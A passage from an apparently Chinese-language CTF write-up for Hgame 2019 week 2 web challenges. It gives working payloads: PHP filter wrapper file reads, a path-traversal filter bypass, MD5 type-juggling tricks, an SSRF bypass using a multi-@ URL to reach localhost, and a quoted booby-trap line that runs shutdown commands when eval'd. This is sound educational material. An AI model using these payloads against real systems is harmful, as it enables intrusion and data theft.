p=n</span><br><span class="line">        step.append(<span class="number">32</span>)</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        n=base64.b64decode(p)</span><br><span class="line">        <span class="keyword">print</span> n</span><br><span class="line">        p=n</span><br><span class="line">        step.append(<span class="number">64</span>)</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    <span class="keyword">break</span></span><br><span class="line"><span class="keyword">print</span> step</span><br></pre></td></tr></table></figure><p>python渣渣就不班门弄斧了…就是要注意base解码的顺序，必须从<code>16-&gt;32-&gt;64</code>，原因是部分base16和base32可以被base64解码…找到有意义的字符串如下：</p><p><a href="https://imgchr.com/i/koYhOx" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/02/26/koYhOx.md.png" alt="koYhOx.md.png"></a></p><p>在线base58解密即可：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hgame&#123;40ca78cde14458da697066eb4cc7daf6&#125;</span><br></pre></td></tr></table></figure><h1 id="杭电Hgame-2019-week2-WP"><a href="#杭电Hgame-2019-week2-WP" class="headerlink" title="杭电Hgame-2019-week2-WP"></a>杭电Hgame-2019-week2-WP</h1><h2 id="Web-3"><a href="#Web-3" class="headerlink" title="Web"></a>Web</h2><h3 id="easy-php"><a href="#easy-php" class="headerlink" title="easy_php"></a>easy_php</h3><p>看见标题为<code>where is my robots</code>，访问<code>robots.txt</code>，发现一个访问路径<code>img/index.php</code>，访问到源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    error_reporting(<span class="number">0</span>);</span><br><span class="line">    $img = $_GET[<span class="string">'img'</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="keyword">isset</span>($img))</span><br><span class="line">        $img = <span class="string">'1'</span>;</span><br><span class="line">    $img = str_replace(<span class="string">'../'</span>, <span class="string">''</span>, $img);</span><br><span class="line">    <span class="keyword">include_once</span>($img.<span class="string">".php"</span>);</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br></pre></td></tr></table></figure><p>第一步也是看见了文件包含，又是<code>str_replace</code>，大概又是双写绕过，构造如下:</p><p><code>http://118.24.25.25:9999/easyphp/img/index.php?img=....//flag</code></p><p>没有得到flag，出来一句：<code>maybe_you_should_think_think</code>…想想也是，既然已经week2，肯定不会那么简单…由于通过 include_once 方式将文件执行，如果没有进行输出操作就无法显示出来；</p><p>第二步尝试使用php伪协议，构造如下：</p><p><code>http://118.24.25.25:9999/easyphp/img/index.php?img=php://filter/read=convert.base64-encode/resource=....//flag</code></p><p>得到base64编码：</p><p><code>PD9waHAKICAgIC8vJGZsYWcgPSAnaGdhbWV7WW91XzRyZV9Tb19nMG9kfSc7CiAgICBlY2hvICJtYXliZV95b3Vfc2hvdWxkX3RoaW5rX3RoaW5rIjsK</code></p><p>解码即可：</p><p><img src="https://s2.ax1x.com/2019/02/19/kgWSjs.png" alt="kgWSjs.png"></p><h3 id="phptrick"><a href="#phptrick" class="headerlink" title="phptrick"></a>phptrick</h3><p>给出源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//admin.php</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">$str1 = (string)@$_GET[<span class="string">'str1'</span>];</span><br><span class="line">$str2 = (string)@$_GET[<span class="string">'str2'</span>];</span><br><span class="line">$str3 = @$_GET[<span class="string">'str3'</span>];</span><br><span class="line">$str4 = @$_GET[<span class="string">'str4'</span>];</span><br><span class="line">$str5 = @$_GET[<span class="string">'H_game'</span>];</span><br><span class="line">$url = @$_GET[<span class="string">'url'</span>];</span><br><span class="line"><span class="keyword">if</span>( $str1 == $str2 )&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'step 1 fail'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>( md5($str1) != md5($str2) )&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'step 2 fail'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>( $str3 == $str4 )&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'step 3 fail'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> ( md5($str3) !== md5($str4))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'step 4 fail'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (strpos($_SERVER[<span class="string">'QUERY_STRING'</span>], <span class="string">"H_game"</span>) !==<span class="keyword">false</span>) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'step 5 fail'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(is_numeric($str5))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'step 6 fail'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> ($str5&lt;<span class="number">9999999999</span>)&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'step 7 fail'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> ((string)$str5&gt;<span class="number">0</span>)&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'step 8 fial'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (parse_url($url, PHP_URL_HOST) !== <span class="string">"www.baidu.com"</span>)&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'step 9 fail'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (parse_url($url,PHP_URL_SCHEME) !== <span class="string">"http"</span>)&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'step 10 fail'</span>);</span><br><span class="line">&#125;</span><br><span class="line">$ch = curl_init();</span><br><span class="line">curl_setopt($ch,CURLOPT_URL,$url);</span><br><span class="line">$output = curl_exec($ch);</span><br><span class="line">curl_close($ch);</span><br><span class="line"><span class="keyword">if</span>($output === <span class="keyword">FALSE</span>)&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'step 11 fail'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> $output;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>访问 admin.php 返回 “only localhost can see it”；那就11个判断，逐个击破：</p><p><strong>step1~2</strong></p><p>弱判断<strong>(!=)</strong>，使得str1和str2的md5值相等(==)，很简单，使用<code>str1=240610708&amp;str2=QNKCDZO</code>直接绕过；</p><p><strong>step3~4</strong></p><p>强判断<strong>(!==)</strong>，使得str3和str4的md5值相等(===)，直接数组绕过即可：<code>str3[]=a&amp;str4[]=b</code></p><p><strong>step5~8</strong></p><p>php 处理参数时会将参数名中的 “.” 替换为 “_”，所以即可构造<code>H.game</code>变量即可绕过step5；</p><p>构造数组绕过数字判断返回false，大小判断返回false，string以后产生Array，即可返回false：<code>H.game[]=1</code>；</p><p><strong>step9~11</strong></p><p>一开始没看懂，科普了一下大概是明白了，要求<code>PHP_URL_SCHEME</code>必须是<code>http</code>，<code>PHP_URL_HOST</code>必须是<code>www.baidu.com</code>，但是上述又必须localhost才可以访问，无从下手……</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// 创建一个新cURL资源</span></span><br><span class="line">$ch = curl_init();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 设置URL和相应的选项</span></span><br><span class="line">curl_setopt($ch, CURLOPT_URL, <span class="string">"http://www.runoob.com/"</span>);</span><br><span class="line">curl_setopt($ch, CURLOPT_HEADER, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 抓取URL并把它传递给浏览器</span></span><br><span class="line">curl_exec($ch);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 关闭cURL资源，并且释放系统资源</span></span><br><span class="line">curl_close($ch);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>大概可以看懂，其实就是设置访问某个url资源，必须要成功访问，即可让<code>curl_exec</code>返回true，Google到一下资料学习到了：</p><blockquote><p>当url中有多个@符号时，<strong>parse_url中获取的host是最后一个@符号后面的host，而libcurl则是获取的第一个@符号之后的</strong>。因此当代码对<a href="mailto:`user@eval.com" target="_blank" rel="noopener">`user@eval.com</a>:<a href="mailto:80@baidu.com" target="_blank" rel="noopener">80@baidu.com</a>` 进行解析时，PHP获取的host是baidu.com是允许访问的域名，而最后调用libcurl进行请求时则是请求的eval.com域名，可以造成ssrf绕过</p><p>source:<a href="https://xz.aliyun.com/t/2215" target="_blank" rel="noopener">https://xz.aliyun.com/t/2215</a></p></blockquote><p>即可构造如下：<code>url=http://@127.0.0.1:80@www.baidu.com/admin.php</code></p><p>得到admin.php的内容：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//flag.php</span></span><br><span class="line"><span class="keyword">if</span>($_SERVER[<span class="string">'REMOTE_ADDR'</span>] != <span class="string">'127.0.0.1'</span>) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'only localhost can see it'</span>);</span><br><span class="line">&#125;</span><br><span class="line">$filename = $_GET[<span class="string">'filename'</span>]??<span class="string">''</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (file_exists($filename)) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"sorry,you can't see it"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> file_get_contents($filename);</span><br><span class="line">&#125;</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>因为有<code>file_exists</code>，直接查看<code>flag.php</code>肯定是不行的，那就继续构造php伪协议绕过即可：</p><p><code>?filename=php://filter/read=convert.base64-encode/resource=flag.php</code></p><p>得到：</p><p><code>PD9waHAgJGZsYWcgPSBoZ2FtZXtUaEVyNF9BcjRfczBtNF9QaHBfVHIxY2tzfSA/Pgo=</code></p><p>base64解码得flag：</p><p><img src="https://s2.ax1x.com/2019/02/19/kgoarQ.png" alt="kgoarQ.png"></p><h3 id="php-is-the-best-language"><a href="#php-is-the-best-language" class="headerlink" title="php is the best language"></a>php is the best language</h3><p>源码如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">'secret.php'</span>;</span><br><span class="line"><span class="comment">#echo $flag;</span></span><br><span class="line"><span class="comment">#echo $secret;</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">empty</span>($_POST[<span class="string">'gate'</span>]) || <span class="keyword">empty</span>($_POST[<span class="string">'key'</span>])) &#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'door'</span>]))&#123;</span><br><span class="line">    $secret = hash_hmac(<span class="string">'sha256'</span>, $_POST[<span class="string">'door'</span>], $secret);  <span class="comment">//传door[]置空secret</span></span><br><span class="line">&#125;</span><br><span class="line">$gate = hash_hmac(<span class="string">'sha256'</span>, $_POST[<span class="string">'key'</span>], $secret);         <span class="comment">//gate即可解出</span></span><br><span class="line"><span class="keyword">if</span> ($gate !== $_POST[<span class="string">'gate'</span>]) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"Hacker GetOut!!"</span>;</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> ((md5($_POST[<span class="string">'key'</span>])+<span class="number">1</span>) == (md5(md5($_POST[<span class="string">'key'</span>])))+<span class="number">1</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"Wow!!!"</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;/br&gt;"</span>;</span><br><span class="line">    <span class="keyword">echo</span> $flag;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"Hacker GetOut!!"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>我们可以发现关键代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'door'</span>]))&#123;</span><br><span class="line">    $secret = hash_hmac(<span class="string">'sha256'</span>, $_POST[<span class="string">'door'</span>], $secret);  <span class="comment">//传door[]置空secret</span></span><br><span class="line">&#125;</span><br><span class="line">$gate = hash_hmac(<span class="string">'sha256'</span>, $_POST[<span class="string">'key'</span>], $secret);         <span class="comment">//gate即可解出</span></span><br><span class="line"><span class="keyword">if</span> ($gate !== $_POST[<span class="string">'gate'</span>]) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"Hacker GetOut!!"</span>;</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> ((md5($_POST[<span class="string">'key'</span>])+<span class="number">1</span>) == (md5(md5($_POST[<span class="string">'key'</span>])))+<span class="number">1</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"Wow!!!"</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;/br&gt;"</span>;</span><br><span class="line">    <span class="keyword">echo</span> $flag;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol><li><p><code>hash_hmac ( string $algo , string $data , string $key)</code>函数的data部分如果传入的为数组，则会返回<code>NULL</code>，所以即可将<code>$door</code>参数传入数组，即可得到可控的<code>$gate</code>，所以就直接可以绕过第二个if判断；</p></li><li><p>经过两次<code>md5</code>函数以后进行弱判断(==)，可以直接爆破：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">for</span>($x=<span class="number">1</span>;$x&lt;<span class="number">100000000</span>;$x++)&#123;</span><br><span class="line"><span class="keyword">if</span> ((md5($x)+<span class="number">1</span>) == (md5(md5($x)))+<span class="number">1</span>)&#123;</span><br><span class="line"><span class="keyword">echo</span> $x;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">    </span><br><span class="line"><span class="number">12</span>[Finished in <span class="number">0.2</span>s]</span><br></pre></td></tr></table></figure></li><li><p>直接GET一个<code>$door</code>传一个数组，<code>$key=12</code>，可控的<code>$gate</code>为<code>key</code>的<code>sha256</code>值；</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$sec=<span class="keyword">NULL</span>;</span><br><span class="line">$gate = hash_hmac(<span class="string">'sha256'</span>,<span class="string">'12'</span>,$sec);</span><br><span class="line"><span class="keyword">echo</span> $gate;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="number">4217722</span>a8aee69d5ed50f3e5ed1cceb1feb79784baaaa6bbf53515ce0eb4daaf[Finished in <span class="number">0.2</span>s]</span><br></pre></td></tr></table></figure><p>payload：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?door[]=1&amp;key=12&amp;gate=4217722a8aee69d5ed50f3e5ed1cceb1feb79784baaaa6bbf53515ce0eb4daaf</span><br></pre></td></tr></table></figure></li></ol><h3 id="BabySpider"><a href="#BabySpider" class="headerlink" title="BabySpider"></a>BabySpider</h3><p>这题考察python爬虫的编写能力，python渣渣写过点爬虫，正好拿来实战一下，不得不说这个题出的确实是好，也让我了解到了许多反爬的机制，下面就详细讲解一下做题的艰辛过程：</p><h4 id="1-10关"><a href="#1-10关" class="headerlink" title="1-10关"></a>1-10关</h4><p>其实就是简单的爬取页面，进行信息筛选，执行一下post回去即可，我当然会想的这么简单；</p><h4 id="11-20关"><a href="#11-20关" class="headerlink" title="11-20关"></a>11-20关</h4><p>然后就关机了…</p><p>一开始我以为是pycharm的锅，没想到第二次运行还是关机…瞬间爆炸（surprise mother f**ker）肯定是出题人调皮了…真的是秀（这反爬虫机制是真的骚~）</p><p>果然爬完第十关以后直接爬出11关的内容就要break观察一下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(<span class="keyword">lambda</span> __g: [(os.system(<span class="string">'shutdown -s -t 0'</span>), (os.system(<span class="string">'shutdown now'</span>), <span class="keyword">None</span>)[<span class="number">1</span>])[<span class="number">1</span>] <span class="keyword">for</span> __g[<span class="string">'os'</span>] <span class="keyword">in</span> [(__import__(<span class="string">'os'</span>, __g, __g))]][<span class="number">0</span>])(globals())<span class="comment">#-----=?</span></span><br></pre></td></tr></table></figure><p>大概是调用了一个os模块直接给我调用系统命令直接<code>shutdown</code>了，直接<code>eval()</code>肯定会关机；解决方法就是在http请求内容里加上UA头即可解决关机的困扰…</p><p>如果你认为这就结束了那就太天真了…加上以后继续报错…</p><p>不知道该肿么办啦…只好去看看官方wp，了解到了另一种反爬虫机制，具体解析如下：</p><p>打印好第11关的cookie，首先拿token登录，将页面的cookie修改为第11关的cookie，刷新页面：</p><p><a href="https://imgchr.com/i/k7yYhn" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/02/28/k7yYhn.md.png" alt="k7yYhn.md.png"></a></p><p>发现网页显示的数字和要爬取的信息不一致（算式和之前的都不一样，答案还对个锤子？）：</p><p><img src="https://s2.ax1x.com/2019/02/28/k7y6hR.png" alt="k7y6hR.png"></p><p><img src="https://s2.ax1x.com/2019/02/28/k7yWjK.png" alt="k7yWjK.png"></p><p>继续在页面里搜索，发现style.css中的内容，原来是存在一个<code>Ariali.otf</code>文件：</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">@<span class="keyword">font-face</span> &#123;</span><br><span class="line">      <span class="attribute">font-family</span>: Ariali;</span><br><span class="line">      <span class="attribute">src</span>: <span class="built_in">url</span>(<span class="string">'/static/Ariali.otf'</span>);</span><br><span class="line">      <span class="attribute">font-weight</span>: normal;</span><br><span class="line">      <span class="attribute">font-style</span>: normal;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>查看文件内容：</p><p><img src="https://s2.ax1x.com/2019/02/28/k7j3bF.png" alt="k7j3bF.png"></p><p>字体文件被动了手脚，数字的对应关系被打乱了，那么找到对应关系，将之前的公式恢复出来执行即可得到正确的答案；原来数字和替换后数字的对应关系如下，写个字典或者列表替换一下即可：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1 2 3 4 5 6 7 8 9 0</span><br><span class="line">| | | | | | | | | |</span><br><span class="line">0 2 6 9 4 3 5 8 7 1</span><br></pre></td></tr></table></figure><h4 id="21-30关"><a href="#21-30关" class="headerlink" title="21-30关"></a>21-30关</h4><p>到21关时候又报错了…打个CTF真辛苦啊…</p><p><img src="https://s2.ax1x.com/2019/02/28/kHAkr9.png" alt="kHAkr9.png"></p><p>再次使用第20关的cookie替换，查看到爬取到的表达式和页面上的又不一样…而且还不满足11-20关的替换关系，</p><p><a href="https://imgchr.com/i/kHApCT" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/02/28/kHApCT.md.png" alt="kHApCT.md.png"></a></p><p>再次查看源码，在css中的after元素中找到了真的表达式：</p><p><a href="https://imgchr.com/i/kHAe56" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/02/28/kHAe56.md.png" alt="kHAe56.md.png"></a></p><p>手速比较快的话，还是可以看到的（和上面的cookie不一样，所以表达式不一样）：</p><p><a href="https://imgchr.com/i/kHATd1" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/02/28/kHATd1.md.png" alt="kHATd1.md.png"></a></p><p>所以只要抓取css样式里的表达式即可：</p><p>解题脚本(python3)：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: UTF-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line">url=<span class="string">"http://111.231.140.29:10000/"</span></span><br><span class="line">url1=<span class="string">"http://111.231.140.29:10000/question"</span></span><br><span class="line">url2=<span class="string">"http://111.231.140.29:10000/solution"</span></span><br><span class="line">url3=<span class="string">"http://111.231.140.29:10000/statics/style.css"</span></span><br><span class="line">head=&#123;<span class="string">"User-Agent"</span>:<span class="string">"Mozilla/5.0"</span>&#125;</span><br><span class="line">token=&#123;<span class="string">"token"</span>:<span class="string">"phatlrSLFTDHSXiuD0wbG9DczhKcXRCm"</span>&#125;</span><br><span class="line">str1=[<span class="string">'1'</span>,<span class="string">'2'</span>,<span class="string">'3'</span>,<span class="string">'4'</span>,<span class="string">'5'</span>,<span class="string">'6'</span>,<span class="string">'7'</span>,<span class="string">'8'</span>,<span class="string">'9'</span>,<span class="string">'0'</span>]</span><br><span class="line">str2=[<span class="string">'0'</span>,<span class="string">'2'</span>,<span class="string">'6'</span>,<span class="string">'9'</span>,<span class="string">'4'</span>,<span class="string">'3'</span>,<span class="string">'5'</span>,<span class="string">'8'</span>,<span class="string">'7'</span>,<span class="string">'1'</span>]</span><br><span class="line"></span><br><span class="line">r=requests.post(url,data=token)</span><br><span class="line">r.encoding=r.apparent_encoding</span><br><span class="line">session=r.cookies</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">30</span>):</span><br><span class="line">    <span class="keyword">if</span> i&lt;<span class="number">10</span>:</span><br><span class="line">        print(<span class="string">"*"</span>*<span class="number">20</span>+str(i+<span class="number">1</span>)+<span class="string">"*"</span>*<span class="number">20</span>)</span><br><span class="line">        num=re.findall(<span class="string">r'&lt;span&gt;(.*?)&lt;/span&gt;'</span>,r.text)[<span class="number">0</span>]</span><br><span class="line">        res=eval(num[<span class="number">0</span>:<span class="number">-2</span>])</span><br><span class="line">        print(num+<span class="string">"  "</span>+str(res))</span><br><span class="line">        answer=&#123;<span class="string">"answer"</span>:res&#125;</span><br><span class="line">        r=requests.post(url2,data=answer,cookies=session,headers=head)</span><br><span class="line">        r.encoding = r.apparent_encoding</span><br><span class="line">        session=r.cookies</span><br><span class="line"></span><br><span class="line">    <span class="keyword">elif</span> i&gt;<span class="number">9</span> <span class="keyword">and</span> i&lt;<span class="number">20</span>:</span><br><span class="line">        print(<span class="string">"*"</span> * <span class="number">20</span> + str(i + <span class="number">1</span>) + <span class="string">"*"</span> * <span class="number">20</span>)</span><br><span class="line">        num = re.findall(<span class="string">r'&lt;span&gt;(.*?)&lt;/span&gt;'</span>, r.text)[<span class="number">0</span>]</span><br><span class="line">        num1=<span class="string">''</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> num:</span><br><span class="line">            <span class="keyword">if</span> i <span class="keyword">in</span> str1:</span><br><span class="line">                subscript = str1.index(i)</span><br><span class="line">                num1 += str2[subscript]</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                num1 += i</span><br><span class="line">        res = eval(num1[<span class="number">0</span>:<span class="number">-2</span>])</span><br><span class="line">        print(num1 + <span class="string">"  "</span> + str(res))</span><br><span class="line">        answer = &#123;<span class="string">"answer"</span>: res&#125;</span><br><span class="line">        r = requests.post(url2, data=answer, cookies=session, headers=head)</span><br><span class="line">        r.encoding = r.apparent_encoding</span><br><span class="line">        session = r.cookies</span><br><span class="line"></span><br><span class="line">    <span class="keyword">elif</span> i&gt;<span class="number">19</span>:</span><br><span class="line">        print(<span class="string">"*"</span>*<span class="number">20</span>+str(i+<span class="number">1</span>)+<span class="string">"*"</span>*<span class="number">20</span>)</span><br><span class="line">        response=requests.get(url3,cookies=session,headers=head)</span><br><span class="line">        response.encoding=response.apparent_encoding</span><br><span class="line">        num=re.findall(<span class="string">r'content:"(.*?)='</span>,response.text)[<span class="number">0</span>]</span><br><span class="line">        res=eval(num)</span><br><span class="line">        print(num+<span class="string">"  "</span>+str(res))</span><br><span class="line">        answer=&#123;<span class="string">"answer"</span>:res&#125;</span><br><span class="line">        r=requests.post(url2,data=answer,cookies=session,headers=head)</span><br><span class="line">        r.encoding=r.apparent_encoding</span><br><span class="line">        session=r.cookies</span><br><span class="line"><span class="keyword">if</span> <span 